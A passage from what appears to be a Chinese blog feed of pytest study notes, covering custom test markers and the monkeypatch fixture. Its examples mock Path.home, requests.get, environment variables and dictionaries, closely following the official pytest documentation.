class="hljs-keyword">def</span> <span class="hljs-title function_">test_function</span>(<span class="hljs-params">param</span>):<br>    <span class="hljs-comment"># 测试代码</span><br><span class="hljs-meta">@pytest.mark.timeout(<span class="hljs-params">timeout_value</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_function</span>():<br>    <span class="hljs-comment"># 测试代码</span><br></code></pre></td></tr></table></figure><p>要运行带有自定义标记 <code>my_marker</code> 的测试项，可以使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pytest -m my_marker</span><br></code></pre></td></tr></table></figure><h2 id="注册标记"><a href="#注册标记" class="headerlink" title="注册标记"></a>注册标记</h2><p>可以在<code>pytest.ini</code>中自定义标记：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[pytest]</span><br><span class="hljs-attr">markers</span> =<br>    slow: marks tests as slow (deselect with &#x27;-m &quot;not slow&quot;&#x27;)<br>    serial<br></code></pre></td></tr></table></figure><p>或者在 <code>pyproject.toml</code> 文件中，如下所示：（toml类似于ini文件，也是一种存储配置文件的方式）</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs toml"><span class="hljs-section">[tool.pytest.ini_options]</span><br><span class="hljs-attr">markers</span> = [<br>    <span class="hljs-string">&quot;slow: marks tests as slow (deselect with &#x27;-m \&quot;not slow\&quot;&#x27;)&quot;</span>,<br>    <span class="hljs-string">&quot;serial&quot;</span>,<br>]<br></code></pre></td></tr></table></figure><p>或者可以在pytest钩子里面注册标记</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">pytest_configure</span>(<span class="hljs-params">config</span>):<br>    config.addinivalue_line(<br>        <span class="hljs-string">&quot;markers&quot;</span>, <span class="hljs-string">&quot;env(name): mark test to run only on named environment&quot;</span><br>    )<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
      <tag>pytest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python 之 pytest mock 数据（七）</title>
    <link href="/2024/01/20/667python-%E4%B9%8B-pytest-mock-%E6%95%B0%E6%8D%AE%EF%BC%88%E4%B8%83%EF%BC%89/"/>
    <url>/2024/01/20/667python-%E4%B9%8B-pytest-mock-%E6%95%B0%E6%8D%AE%EF%BC%88%E4%B8%83%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="pytest之Monkeypatching猴子补丁"><a href="#pytest之Monkeypatching猴子补丁" class="headerlink" title="pytest之Monkeypatching猴子补丁"></a>pytest之Monkeypatching猴子补丁</h1><p>有时测试需要调用依赖于全局设置的功能或调用不易测试的代码（例如网络访问）。夹具<code>monkeypatch</code>可帮助您安全地设置&#x2F;删除属性、字典项或环境变量，或进行修改<code>sys.path</code>以供导入。</p><p>概念：</p><p>在运行时动态修改模块、类或函数，通常是添加功能或修正缺陷。</p><p><strong>猴子补丁在代码运行时（内存中）发挥作用，不会修改源码，因此只对当前运行的程序实例有效。</strong></p><p>因为猴子补丁破坏了封装，而且容易导致程序与补丁代码的实现细节紧密耦合，所以被视为临时的变通方案，不是集成代码的推荐方式。<br>在Python语言中，monkey patch 指的是对于一个类或者模块所进行的动态修改。在Python语言中，我们其实可以在运行时修改代码的行为。</p><p>该<code>monkeypatch</code>装置提供了以下辅助方法，用于在测试中安全地修补和模拟功能：</p><ul><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setattr"><code>monkeypatch.setattr(obj, name, value, raising=True)</code></a></li><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.delattr"><code>monkeypatch.delattr(obj, name, raising=True)</code></a></li><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setitem"><code>monkeypatch.setitem(mapping, name, value)</code></a></li><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.delitem"><code>monkeypatch.delitem(obj, name, raising=True)</code></a></li><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setenv"><code>monkeypatch.setenv(name, value, prepend=None)</code></a></li><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.delenv"><code>monkeypatch.delenv(name, raising=True)</code></a></li><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.syspath_prepend"><code>monkeypatch.syspath_prepend(path)</code></a></li><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.chdir"><code>monkeypatch.chdir(path)</code></a></li><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.context"><code>monkeypatch.context()</code></a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">monkeypatch.<span class="hljs-built_in">setattr</span>(obj, name, value, raising=<span class="hljs-literal">True</span>)<br>monkeypatch.<span class="hljs-built_in">delattr</span>(obj, name, raising=<span class="hljs-literal">True</span>)<br>monkeypatch.setitem(mapping, name, value)<br>monkeypatch.delitem(obj, name, raising=<span class="hljs-literal">True</span>)<br>monkeypatch.setenv(name, value, prepend=<span class="hljs-literal">False</span>)<br>monkeypatch.delenv(name, raising=<span class="hljs-literal">True</span>)<br>monkeypatch.syspath_prepend(path)<br>monkeypatch.chdir(path)<br><br></code></pre></td></tr></table></figure><p>请求测试函数或装置完成后，所有修改都将被撤消。 如果设置&#x2F;删除操作的目标不存在，则该<code>raising</code> 参数确定是否引发<code>KeyError</code>或。<code>AttributeError</code></p><p>请考虑以下情形：</p><ol><li>修改函数的行为或类的属性以进行测试，例如，有一个 API 调用或数据库连接，你不会对其进行测试，但你知道预期的输出应该是什么。使用<a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setattr"><code>monkeypatch.setattr</code></a>修补函数或属性以达到您想要的测试行为。这也可以包括自己定义自己的函数。使用<a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.delattr"><code>monkeypatch.delattr</code></a>删除测试的函数或属性。 </li><li>修改字典的值例如，你有一个全局配置，想要针对某些测试用例进行修改。用于<a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setitem"><code>monkeypatch.setitem</code></a>修补测试字典。<a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.delitem"><code>monkeypatch.delitem</code></a>可用于删除项目。</li><li>修改环境变量以进行测试，例如，如果缺少环境变量，则测试程序行为，或者为已知变量设置多个值。 <a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setenv"><code>monkeypatch.setenv</code></a>并可<a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.delenv"><code>monkeypatch.delenv</code></a>用于这些补丁。</li><li>使用修改，并 在测试期间更改当前工作目录的上下文。<code>monkeypatch.setenv(&quot;PATH&quot;, value, prepend=os.pathsep)``$PATH</code><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.chdir"><code>monkeypatch.chdir</code></a></li><li>使用<a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.syspath_prepend"><code>monkeypatch.syspath_prepend</code></a>修改<code>sys.path</code>也会调用<code>pkg_resources.fixup_namespace_packages</code>和<a href="https://docs.python.org/3/library/importlib.html#importlib.invalidate_caches"><code>importlib.invalidate_caches()</code></a>。</li><li><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.context"><code>monkeypatch.context</code></a>仅在特定范围内应用补丁，这有助于控制复杂装置或 stdlib 补丁的拆除。</li></ol><h2 id="Monkeypatching函数"><a href="#Monkeypatching函数" class="headerlink" title="Monkeypatching函数"></a>Monkeypatching函数</h2><p>思考一下你正在使用用户目录的情况。在测试环境中，您不希望测试依赖于正在运行的用户。<code>monkeypatch</code> 可用于模拟用户依赖的函数，使其始终返回你设定的特定值。</p><p>代码示例：</p><p>在此示例中，<a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setattr"><code>monkeypatch.setattr</code></a>用于修补<code>Path.home</code> ，以便<code>Path(&quot;/abc&quot;)</code>在运行测试时始终使用已知的测试路径。这消除了对正在运行的用户的任何依赖，以达到测试目的。 <a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setattr"><code>monkeypatch.setattr</code></a>必须在调用将使用修补函数的函数之前调用。测试函数完成后，<code>Path.home</code>修改将被撤消。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><span class="hljs-built_in">print</span>(Path.home())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getssh</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Simple function to return expanded homedir ssh path.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> Path.home() / <span class="hljs-string">&quot;.ssh&quot;</span> <span class="hljs-comment"># Path.home()返回的是/home/user ，拼接后/home/user/ssh</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_getssh</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-comment"># mocked return function to replace Path.home</span><br>    <span class="hljs-comment"># always return &#x27;/abc&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mockreturn</span>(): <span class="hljs-comment"># 模拟返回</span><br>        <span class="hljs-keyword">return</span> Path(<span class="hljs-string">&quot;/abc&quot;</span>)<br><br>    <span class="hljs-comment"># Application of the monkeypatch to replace Path.home</span><br>    <span class="hljs-comment"># with the behavior of mockreturn defined above.</span><br>    monkeypatch.<span class="hljs-built_in">setattr</span>(Path, <span class="hljs-string">&quot;home&quot;</span>, mockreturn) <span class="hljs-comment"># 设置，当你调用Path.home时，使用mockreturn ，mockreturn返回的是/abc</span><br><br>    <span class="hljs-comment"># Calling getssh() will use mockreturn in place of Path.home</span><br>    <span class="hljs-comment"># for this test with the monkeypatch.</span><br>    x = getssh() <span class="hljs-comment"># 调用getssh()，实际调用的是mockreturn，返回的是/abc</span><br>    <span class="hljs-built_in">print</span>(x)<br>    <span class="hljs-keyword">assert</span> x == Path(<span class="hljs-string">&quot;/abc/.ssh&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="Monkeypatching-返回对象：构建模拟类"><a href="#Monkeypatching-返回对象：构建模拟类" class="headerlink" title="Monkeypatching 返回对象：构建模拟类"></a>Monkeypatching 返回对象：构建模拟类</h2><p><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setattr"><code>monkeypatch.setattr</code></a>也可以与类结合使用，模拟函数所返回的是对象而不是值。定义一个简单的函数，它接受 API url 并返回 json 响应。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of app.py, a simple API retrieval example</span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_json</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Takes a URL, and returns the JSON.&quot;&quot;&quot;</span><br>    r = requests.get(url) <span class="hljs-comment"># 发起url请求</span><br>    <span class="hljs-keyword">return</span> r.json()<br></code></pre></td></tr></table></figure><p>为了测试，我们需要模拟<code>r</code>返回的响应对象。模拟的<code>r</code>对象必须要有一个<code>.json()</code>返回字典的方法。接下来我们可以通过在测试文件中定义一个类来 mock <code>r</code>对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of test_app.py, a simple test for our API retrieval</span><br><span class="hljs-comment"># import requests for the purposes of monkeypatching</span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># our app.py that includes the get_json() function</span><br><span class="hljs-comment"># this is the previous code block example</span><br><span class="hljs-keyword">import</span> app <span class="hljs-comment"># 导入app.py</span><br><br><br><span class="hljs-comment"># custom class to be the mock return value</span><br><span class="hljs-comment"># will override the requests.Response returned from requests.get</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockResponse</span>:<br>    <span class="hljs-comment"># mock json() method always returns a specific testing dictionary</span><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">json</span>():<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;mock_key&quot;</span>: <span class="hljs-string">&quot;mock_response&quot;</span>&#125; <span class="hljs-comment"># MockResponse的.json()方法总是返回一个字典</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_get_json</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-comment"># Any arguments may be passed and mock_get() will always return our</span><br>    <span class="hljs-comment"># mocked object, which only has the .json() method.</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mock_get</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        <span class="hljs-keyword">return</span> MockResponse() <span class="hljs-comment"># 返回MockResponse对象，这里返回的就是我们要mock的r对象</span><br><br>    <span class="hljs-comment"># apply the monkeypatch for requests.get to mock_get</span><br>    monkeypatch.<span class="hljs-built_in">setattr</span>(requests, <span class="hljs-string">&quot;get&quot;</span>, mock_get) <span class="hljs-comment"># 给requests.get方法的返回值定义为我们的mock_get所返回的MockResponse对象</span><br>    <span class="hljs-comment"># 这里就相当于什么，相当于之前的 r = requests.get(&quot;https://fakeurl&quot;) 就等于我们的r = MockResponse()所返回的MockResponse对象</span><br><br>    <span class="hljs-comment"># app.get_json, which contains requests.get, uses the monkeypatch</span><br>    result = app.get_json(<span class="hljs-string">&quot;https://fakeurl&quot;</span>) <span class="hljs-comment"># 这里就相当于就是 r.json()也相当于是我们mock的对象的mock_get()所返回的&#123;&quot;mock_key&quot;: &quot;mock_response&quot;&#125;)</span><br>    <span class="hljs-keyword">assert</span> result[<span class="hljs-string">&quot;mock_key&quot;</span>] == <span class="hljs-string">&quot;mock_response&quot;</span><br></code></pre></td></tr></table></figure><p>测试成功，打印一下返回内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">============================= test session starts ==============================<br>platform linux -- Python <span class="hljs-number">3.10</span><span class="hljs-number">.12</span>, pytest-<span class="hljs-number">8.1</span><span class="hljs-number">.1</span>, pluggy-<span class="hljs-number">1.4</span><span class="hljs-number">.0</span> -- /home/wang/code/fastApiStudy/venvadmin/<span class="hljs-built_in">bin</span>/python<br>cachedir: .pytest_cache<br>rootdir: /home/wang/code/<br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collecting ... collected <span class="hljs-number">1</span> item<br><br>testcases/test_app.py::test_get_json <br>result: &#123;<span class="hljs-string">&#x27;mock_key&#x27;</span>: <span class="hljs-string">&#x27;mock_response&#x27;</span>&#125; <span class="hljs-comment"># 打印出来就是我们设置的</span><br>PASSED<br><br>============================== <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.03</span>s ===============================<br>Finished running tests!<br></code></pre></td></tr></table></figure><p>也可以根据测试场景构建一些复杂的类给到<code>mockresponse</code></p><p>例如这个类返回的属性中始终会有一个<code>ok</code>的属性，</p><p>或者根据输入的不同的字符串给<code>.json()方法</code>返回不同的值</p><p>也可以使用以下方式在测试之间共享此模拟<code>fixture</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"> contents of test_app.py, a simple test <span class="hljs-keyword">for</span> our API retrieval<br><span class="hljs-keyword">import</span> pytest<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># app.py that includes the get_json() function</span><br><span class="hljs-keyword">import</span> app<br><br><br><span class="hljs-comment"># custom class to be the mock return value of requests.get()</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MockResponse</span>:<br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">json</span>():<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;mock_key&quot;</span>: <span class="hljs-string">&quot;mock_response&quot;</span>&#125;<br><br><br><span class="hljs-comment"># monkeypatched requests.get moved to a fixture</span><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mock_response</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Requests.get() mocked to return &#123;&#x27;mock_key&#x27;:&#x27;mock_response&#x27;&#125;.&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mock_get</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        <span class="hljs-keyword">return</span> MockResponse()<br><br>    monkeypatch.<span class="hljs-built_in">setattr</span>(requests, <span class="hljs-string">&quot;get&quot;</span>, mock_get) <span class="hljs-comment"># 设置属性</span><br><br><br><span class="hljs-comment"># notice our test uses the custom fixture instead of monkeypatch directly</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_get_json</span>(<span class="hljs-params">mock_response</span>):<br>    result = app.get_json(<span class="hljs-string">&quot;https://fakeurl&quot;</span>)<br>    <span class="hljs-keyword">assert</span> result[<span class="hljs-string">&quot;mock_key&quot;</span>] == <span class="hljs-string">&quot;mock_response&quot;</span><br></code></pre></td></tr></table></figure><p>此外，如果设计mock想要应用于所有的测试用例，则<code>fixture</code>可以在<code>conftest.py</code>文件中定义 ，并在<code>pytest.ini</code>配置文件中使用<code>withautouse=True</code>这个选项选项。</p><h2 id="全局补丁示例：阻止远程操作的“请求”"><a href="#全局补丁示例：阻止远程操作的“请求”" class="headerlink" title="全局补丁示例：阻止远程操作的“请求”"></a>全局补丁示例：阻止远程操作的“请求”</h2><p>如果你想阻止“requests”库在所有测试中执行http请求，你可以执行以下操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of conftest.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.fixture(<span class="hljs-params">autouse=<span class="hljs-literal">True</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">no_requests</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Remove requests.sessions.Session.request for all tests.&quot;&quot;&quot;</span><br>    monkeypatch.<span class="hljs-built_in">delattr</span>(<span class="hljs-string">&quot;requests.sessions.Session.request&quot;</span>)<br></code></pre></td></tr></table></figure><p>此自动使用装置将针对每个测试功能执行，它将删除该方法<code>request.session.Session.request</code> ，以便在测试中创建 http 请求的任何尝试都将失败。</p><h2 id="Monkeypatching-环境变量"><a href="#Monkeypatching-环境变量" class="headerlink" title="Monkeypatching 环境变量"></a>Monkeypatching 环境变量</h2><p>如果您正在使用环境变量，则经常需要安全地更改值或将其从系统中删除以进行测试。提供了一种使用and方法<code>monkeypatch</code>执行此操作的机制。我们的示例代码用于测试：<code>setenv``delenv</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># contents of our original code file e.g. code.py</span><br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_os_user_lower</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Simple retrieval function.</span><br><span class="hljs-string">    Returns lowercase USER or raises OSError.&quot;&quot;&quot;</span><br>    username = os.getenv(<span class="hljs-string">&quot;USER&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> username <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">raise</span> OSError(<span class="hljs-string">&quot;USER environment is not set.&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> username.lower()<br></code></pre></td></tr></table></figure><p>有两种可能的路径。首先，<code>USER</code>环境变量被设置为一个值。其次，<code>USER</code>环境变量不存在。使用这<code>monkeypatch</code> 两种路径都可以安全地进行测试，而不会影响运行环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of our test file e.g. test_code.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_upper_to_lower</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Set the USER env var to assert the behavior.&quot;&quot;&quot;</span><br>    monkeypatch.setenv(<span class="hljs-string">&quot;USER&quot;</span>, <span class="hljs-string">&quot;TestingUser&quot;</span>) <span class="hljs-comment"># 设置环境变量</span><br>    <span class="hljs-keyword">assert</span> get_os_user_lower() == <span class="hljs-string">&quot;testinguser&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_raise_exception</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Remove the USER env var and assert OSError is raised.&quot;&quot;&quot;</span><br>    monkeypatch.delenv(<span class="hljs-string">&quot;USER&quot;</span>, raising=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">with</span> pytest.raises(OSError):<br>        _ = get_os_user_lower()<br></code></pre></td></tr></table></figure><p>此行为可以移至<code>fixture</code>结构中并在测试之间共享：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of our test file e.g. test_code.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mock_env_user</span>(<span class="hljs-params">monkeypatch</span>):<br>    monkeypatch.setenv(<span class="hljs-string">&quot;USER&quot;</span>, <span class="hljs-string">&quot;TestingUser&quot;</span>)<br><br><br><span class="hljs-meta">@pytest.fixture</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mock_env_missing</span>(<span class="hljs-params">monkeypatch</span>):<br>    monkeypatch.delenv(<span class="hljs-string">&quot;USER&quot;</span>, raising=<span class="hljs-literal">False</span>)<br><br><br><span class="hljs-comment"># notice the tests reference the fixtures for mocks</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_upper_to_lower</span>(<span class="hljs-params">mock_env_user</span>):<br>    <span class="hljs-keyword">assert</span> get_os_user_lower() == <span class="hljs-string">&quot;testinguser&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_raise_exception</span>(<span class="hljs-params">mock_env_missing</span>):<br>    <span class="hljs-keyword">with</span> pytest.raises(OSError):<br>        _ = get_os_user_lower()<br></code></pre></td></tr></table></figure><h2 id="Monkeypatching-字典"><a href="#Monkeypatching-字典" class="headerlink" title="Monkeypatching 字典"></a>Monkeypatching 字典</h2><p><a href="https://docs.pytest.org/en/8.0.x/reference/reference.html#pytest.MonkeyPatch.setitem"><code>monkeypatch.setitem</code></a>可用于在测试期间安全地将字典的值设置为特定值。以下是简化的连接字符串示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of app.py to generate a simple connection string</span><br>DEFAULT_CONFIG = &#123;<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;user1&quot;</span>, <span class="hljs-string">&quot;database&quot;</span>: <span class="hljs-string">&quot;db1&quot;</span>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_connection_string</span>(<span class="hljs-params">config=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Creates a connection string from input or defaults.&quot;&quot;&quot;</span><br>    config = config <span class="hljs-keyword">or</span> DEFAULT_CONFIG<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;User Id=<span class="hljs-subst">&#123;config[<span class="hljs-string">&#x27;user&#x27;</span>]&#125;</span>; Location=<span class="hljs-subst">&#123;config[<span class="hljs-string">&#x27;database&#x27;</span>]&#125;</span>;&quot;</span><br></code></pre></td></tr></table></figure><p>为了测试目的，我们可以将<code>DEFAULT_CONFIG</code>字典修补为特定值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># contents of test_app.py</span><br><span class="hljs-comment"># app.py with the connection string function (prior code block)</span><br><span class="hljs-keyword">import</span> app<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_connection</span>(<span class="hljs-params">monkeypatch</span>):<br>    <span class="hljs-comment"># Patch the values of DEFAULT_CONFIG to specific</span><br>    <span class="hljs-comment"># testing values only for this 